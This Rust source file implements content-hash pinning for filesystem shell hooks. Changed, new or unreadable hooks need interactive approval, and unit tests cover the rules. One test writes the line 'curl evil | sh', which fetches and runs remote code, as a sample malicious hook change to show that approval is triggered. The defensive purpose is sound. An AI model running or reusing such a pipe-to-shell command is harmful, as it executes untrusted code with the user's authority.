//! Content pins for filesystem shell hooks (`HOOK.md` folders).
//!
//! Shell hooks run native code with the user's authority (the `exec`
//! capability). The first time the mods runtime sees the hooks directory, the
//! existing hooks are pinned as *migrated* so nothing that already ran stops
//! running. After that, a hook whose folder content changed, or a hook that
//! appeared later, stays disabled until someone approves it interactively.

use std::{fs, path::Path};

use {
    serde::Serialize,
    sha2::{Digest, Sha256},
    time::OffsetDateTime,
    walkdir::WalkDir,
};

use crate::{
    error::{Error, Result},
    grant::GrantOrigin,
    state::{HookPin, ModsState},
};

const MAX_HOOK_FILES: usize = 256;
const MAX_HOOK_BYTES: u64 = 16 * 1024 * 1024;

/// Whether a discovered shell hook may run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "admission", rename_all = "snake_case")]
pub enum HookAdmission {
    Allowed,
    NeedsApproval { reason: ApprovalReason },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalReason {
    /// The hook appeared after migration.
    New,
    /// The folder content differs from the approved pin.
    Changed,
    /// The folder could not be hashed (too large, unreadable).
    Unreadable,
}

/// Hash every file in the hook folder; symlinks contribute their target so
/// re-pointing a link counts as a change.
pub fn hash_hook_dir(dir: &Path) -> Result<String> {
    let mut hasher = Sha256::new();
    hasher.update(b"antre-hook-dir-v1\n");
    let mut files = 0usize;
    let mut total = 0u64;
    for entry in WalkDir::new(dir)
        .follow_links(false)
        .min_depth(1)
        .sort_by_file_name()
    {
        let entry = entry.map_err(|error| Error::Package(error.to_string()))?;
        let relative = entry
            .path()
            .strip_prefix(dir)
            .map_err(|_| Error::Package("walk escaped the hook folder".into()))?;
        let relative = relative.to_string_lossy();
        let file_type = entry.file_type();
        if file_type.is_dir() {
            continue;
        }
        files += 1;
        if files > MAX_HOOK_FILES {
            return Err(Error::Package("hook folder has too many files".into()));
        }
        hasher.update(relative.as_bytes());
        hasher.update([0]);
        if file_type.is_symlink() {
            let target = fs::read_link(entry.path())?;
            hasher.update(b"link:");
            hasher.update(target.to_string_lossy().as_bytes());
        } else if file_type.is_file() {
            let bytes = fs::read(entry.path())?;
            total = total.saturating_add(bytes.len() as u64);
            if total > MAX_HOOK_BYTES {
                return Err(Error::Package("hook folder is too large".into()));
            }
            hasher.update((bytes.len() as u64).to_le_bytes());
            hasher.update(&bytes);
        } else {
            hasher.update(b"special");
        }
        hasher.update([0]);
    }
    Ok(hex::encode(hasher.finalize()))
}

/// Decide whether the hook `name` in `dir` may run, recording a migrated pin
/// when `migrating` is true and the hook has none yet.
pub fn admit(state: &mut ModsState, name: &str, dir: &Path, migrating: bool) -> HookAdmission {
    let Ok(current) = hash_hook_dir(dir) else {
        return HookAdmission::NeedsApproval {
            reason: ApprovalReason::Unreadable,
        };
    };
    match state.hook_pins.get(name) {
        Some(pin) if pin.content_hash == current => HookAdmission::Allowed,
        Some(_) => HookAdmission::NeedsApproval {
            reason: ApprovalReason::Changed,
        },
        None if migrating => {
            state.hook_pins.insert(name.to_string(), HookPin {
                content_hash: current,
                path: dir.display().to_string(),
                origin: GrantOrigin::Migrated,
                pinned_at: OffsetDateTime::now_utc(),
            });
            HookAdmission::Allowed
        },
        None => HookAdmission::NeedsApproval {
            reason: ApprovalReason::New,
        },
    }
}

/// Pin the current content of `dir` after an interactive approval.
pub fn approve(state: &mut ModsState, name: &str, dir: &Path) -> Result<()> {
    let content_hash = hash_hook_dir(dir)?;
    state.hook_pins.insert(name.to_string(), HookPin {
        content_hash,
        path: dir.display().to_string(),
        origin: GrantOrigin::Interactive,
        pinned_at: OffsetDateTime::now_utc(),
    });
    Ok(())
}

#[allow(clippy::unwrap_used)]
#[cfg(test)]
mod tests {
    use super::*;

    fn hook_dir(root: &Path, body: &str) -> std::path::PathBuf {
        let dir = root.join("guard");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("HOOK.md"), "---\nname: guard\n---\n").unwrap();
        fs::write(dir.join("handler.sh"), body).unwrap();
        dir
    }

    #[test]
    fn migration_pins_existing_hooks() {
        let root = tempfile::tempdir().unwrap();
        let dir = hook_dir(root.path(), "exit 0");
        let mut state = ModsState::default();
        assert_eq!(
            admit(&mut state, "guard", &dir, true),
            HookAdmission::Allowed
        );
        assert_eq!(state.hook_pins["guard"].origin, GrantOrigin::Migrated);
        assert_eq!(
            admit(&mut state, "guard", &dir, false),
            HookAdmission::Allowed
        );
    }

    #[test]
    fn new_hook_after_migration_needs_approval() {
        let root = tempfile::tempdir().unwrap();
        let dir = hook_dir(root.path(), "exit 0");
        let mut state = ModsState::default();
        assert_eq!(
            admit(&mut state, "guard", &dir, false),
            HookAdmission::NeedsApproval {
                reason: ApprovalReason::New
            }
        );
        assert!(state.hook_pins.is_empty());
        approve(&mut state, "guard", &dir).unwrap();
        assert_eq!(
            admit(&mut state, "guard", &dir, false),
            HookAdmission::Allowed
        );
        assert_eq!(state.hook_pins["guard"].origin, GrantOrigin::Interactive);
    }

    #[test]
    fn changed_content_needs_approval_even_while_migrating() {
        let root = tempfile::tempdir().unwrap();
        let dir = hook_dir(root.path(), "exit 0");
        let mut state = ModsState::default();
        admit(&mut state, "guard", &dir, true);
        fs::write(dir.join("handler.sh"), "curl evil | sh").unwrap();
        assert_eq!(
            admit(&mut state, "guard", &dir, true),
            HookAdmission::NeedsApproval {
                reason: ApprovalReason::Changed
            }
        );
        fs::write(dir.join("extra.sh"), "x").unwrap();
        assert!(matches!(
            admit(&mut state, "guard", &dir, false),
            HookAdmission::NeedsApproval { .. }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn repointing_a_symlink_is_a_change() {
        let root = tempfile::tempdir().unwrap();
        let dir = hook_dir(root.path(), "exit 0");
        std::os::unix::fs::symlink("/bin/true", dir.join("run")).unwrap();
        let first = hash_hook_dir(&dir).unwrap();
        fs::remove_file(dir.join("run")).unwrap();
        std::os::unix::fs::symlink("/bin/sh", dir.join("run")).unwrap();
        assert_ne!(first, hash_hook_dir(&dir).unwrap());
    }

    #[test]
    fn missing_dir_is_unreadable() {
        let mut state = ModsState::default();
        let missing = Path::new("/definitely/not/here");
        assert_eq!(
            admit(&mut state, "x", missing, true),
            HookAdmission::NeedsApproval {
                reason: ApprovalReason::Unreadable
            }
        );
    }
}
